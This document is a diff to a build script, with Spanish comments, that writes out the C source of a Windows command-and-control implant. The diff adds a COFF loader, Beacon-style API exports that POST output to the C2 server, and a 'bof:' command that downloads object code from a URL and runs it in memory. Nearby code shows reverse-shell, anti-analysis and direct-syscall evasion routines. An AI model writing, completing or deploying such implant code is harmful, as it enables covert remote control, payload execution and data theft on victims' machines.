@@ -171,11 +171,13 @@ echo "USER_AGENT3: $USER_AGENT3"
 echo "KEY: $XOR_KEY_HEX"
 echo "OUTPUT: $OUTPUT"
 
+chmod +x build.sh && ./build.sh
+
 # === GENERAR Makefile ===
 cat > Makefile << EOF
 .PHONY: windows clean upx
 windows: beacon.c
-	x86_64-w64-mingw32-gcc beacon.c aes.c cJSON.c -o $OUTPUT -lwinhttp -lcrypt32 -lws2_32 -liphlpapi -lbcrypt -lshlwapi -lrpcrt4 -DUNICODE -D_UNICODE 
+	x86_64-w64-mingw32-gcc beacon.c aes.c cJSON.c COFFLoader.o -o $OUTPUT -lwinhttp -lcrypt32 -lws2_32 -liphlpapi -lbcrypt -lshlwapi -lrpcrt4 -lole32 -loleaut32 -luser32 -DUNICODE -D_UNICODE -D_CRT_SECURE_NO_WARNINGS  
 clean:
 	#rm -f $OUTPUT beacon.c
 upx:
@@ -210,6 +212,8 @@ cat > beacon.c << EOF
 
 #include "aes.h"
 #include "cJSON.h"
+#include "beacon.h"
+#include "COFFLoader.h"
 
 #pragma warning(disable: 4005)
 #pragma comment(lib, "secur32.lib")
@@ -579,8 +583,111 @@ void __cdecl ReverseShell(void* arg);
 void cleanupProxy();
 BOOL anti_analysis(void);
 HMODULE GetNtdllBase(void);
+void handleAdversary(char* command);
 
 
+// === Beacon API: implementaciones exportables para BOFs ===
+
+__declspec(dllexport) void BeaconDataParse(datap * parser, char * buffer, int size) {
+    parser->original = buffer;
+    parser->buffer = buffer;
+    parser->length = size;
+}
+
+__declspec(dllexport) char * BeaconDataPtr(datap * parser, int size) {
+    if (parser->length < size) return NULL;
+    char * out = parser->buffer;
+    parser->buffer += size;
+    parser->length -= size;
+    return out;
+}
+
+__declspec(dllexport) int BeaconDataInt(datap * parser) {
+    int * val = (int *)BeaconDataPtr(parser, sizeof(int));
+    return val ? *val : 0;
+}
+
+__declspec(dllexport) short BeaconDataShort(datap * parser) {
+    short * val = (short *)BeaconDataPtr(parser, sizeof(short));
+    return val ? *val : 0;
+}
+
+__declspec(dllexport) int BeaconDataLength(datap * parser) {
+    int * val = (int *)BeaconDataPtr(parser, sizeof(int));
+    return val ? *val : 0;
+}
+
+__declspec(dllexport) char * BeaconDataExtract(datap * parser, int * size) {
+    int len = BeaconDataLength(parser);
+    if (len < 0 || len > parser->length) return NULL;
+    char * out = parser->buffer;
+    parser->buffer += len;
+    parser->length -= len;
+    if (size) *size = len;
+    return out;
+}
+
+__declspec(dllexport) void BeaconPrintf(int type, const char * fmt, ...) {
+    char buffer[4096] = {0};
+    char full_url[512];
+    char json[8192];
+    va_list args;
+    
+    va_start(args, fmt);
+    int len = vsnprintf(buffer, sizeof(buffer), fmt, args);
+    va_end(args);
+    
+    // Manejo de errores de vsnprintf
+    if (len < 0) {
+        fprintf(stderr, "[ERROR] vsnprintf failed\n");
+        return;
+    }
+    
+    // Truncar si es necesario
+    if (len >= sizeof(buffer)) {
+        len = sizeof(buffer) - 1;
+        buffer[len] = '\0';
+    }
+    
+    fputs(buffer, stdout);
+    fflush(stdout);
+    
+    // Verificar tamaños antes de concatenar
+    //if (strlen(C2_URL) + strlen(MALEABLE) >= sizeof(full_url)) {
+    //    fprintf(stderr, "[ERROR] URL too long\n");
+    //    return;
+    //}
+    
+    //strcpy(full_url, C2_URL);
+    //strcat(full_url, MALEABLE);
+    
+    // Escapar JSON y limitar longitud
+    //int max_json_content = sizeof(json) - 50;
+    //int usable = (len > max_json_content) ? max_json_content : len;
+    
+    // Función para escapar JSON sería ideal aquí
+    //snprintf(json, sizeof(json), "{\\"output\\":\\"%.*s\\"}", usable, buffer);
+    
+    //char *encrypted = encrypt_data(json);
+    //if (encrypted) {
+        // retry_http_request(full_url, "POST", encrypted, MAX_RETRIES);
+        // No olvides liberar encrypted si es necesario
+    //}
+}
+
+__declspec(dllexport) void BeaconOutput(int type, const char * data, int len) {
+    char * copy = malloc(len + 1);
+    if (!copy) return;
+    memcpy(copy, data, len);
+    copy[len] = 0;
+
+    char json[8192];
+    int max = sizeof(json) - 50;
+    int usable = (strlen(copy) > max) ? max : strlen(copy);
+    snprintf(json, sizeof(json), "{\\"output\\":\\"%.*s\\"}", usable, copy);
+    retry_http_request(C2_URL, "POST", json, 1);
+    free(copy);
+}
 // === HELL'S GATE + HELLDESCENT ===
 static volatile DWORD __syscall_ssn = 0;
 typedef NTSTATUS (NTAPI *SpLsaModeInitialize_t)(ULONG, PULONG, void**, PULONG);
@@ -4767,6 +4874,40 @@ BOOL handleDownload(const char* command) {
     return FALSE;
 }
 
+void SerializeBeaconString(char* buffer, int* offset, const char* str) {
+    int len = strlen(str);
+    // Beacon serializa strings como: [DWORD len][bytes sin null]
+    memcpy(buffer + *offset, &len, sizeof(int));
+    *offset += sizeof(int);
+    memcpy(buffer + *offset, str, len);
+    *offset += len;
+}
+
+void BeaconDataSerializeString(char* buffer, int* offset, const char* str) {
+    int len = strlen(str);
+    memcpy(buffer + *offset, &len, sizeof(int));
+    *offset += sizeof(int);
+    memcpy(buffer + *offset, str, len);
+    *offset += len;
+}
+
+void go(unsigned char * bof_data, int bof_size, char * args, int args_len) {
+    BeaconPrintf(CALLBACK_OUTPUT, "[BOF] Descargado: %d bytes", bof_size);
+
+    if (!args || args_len <= 0) {
+        args = "";
+        args_len = 0;
+    }
+
+    BeaconPrintf(CALLBACK_OUTPUT, "[BOF] Ejecutando con argumento: '%.*s' (len=%d)", 
+                args_len, args, args_len);
+    
+    // ✅ Ya NO necesitamos alineación manual aquí - RunCOFF se encarga
+    int result = RunCOFF("go", bof_data, bof_size, (unsigned char*)args, args_len);
+    
+    BeaconPrintf(CALLBACK_OUTPUT, "[BOF] RunCOFF result = %d", result);
+}
+
 // Función principal de manejo de comandos
 void handleAdversary(char* command) {
     printf("[*] Handling adversary command: %s\n", command);
@@ -5142,6 +5283,23 @@ void handleAdversary(char* command) {
         char* url = command + 12;
         LoadModuleFromURL(url);
         snprintf(output, sizeof(output), "Módulo cargado: %s", url);
+        goto send_response;
+    }
+
+    if (strncmp(command, "bof:", 4) == 0) {
+        char * bof_path = command + 4;
+        char * args = strchr(bof_path, ' ');
+        if (args) *args++ = 0;
+
+        DWORD bof_size = 0;
+        unsigned char * bof_data = DownloadToBuffer(bof_path, &bof_size);
+        if (!bof_data || bof_size == 0) {
+            snprintf(error, sizeof(error), "Failed to download BOF: %s", bof_path);
+            goto send_response;
+        }
+
+        go(bof_data, bof_size, args, args ? strlen(args) : 0);
+        free(bof_data);
         goto send_response;
     }
 
@@ -5609,6 +5767,7 @@ HGLOBAL download_payload() {
     HeapFree(GetProcessHeap(), 0, buffer);
     return hMem;
 }
+
 
 // === MAIN ===
 int main() {
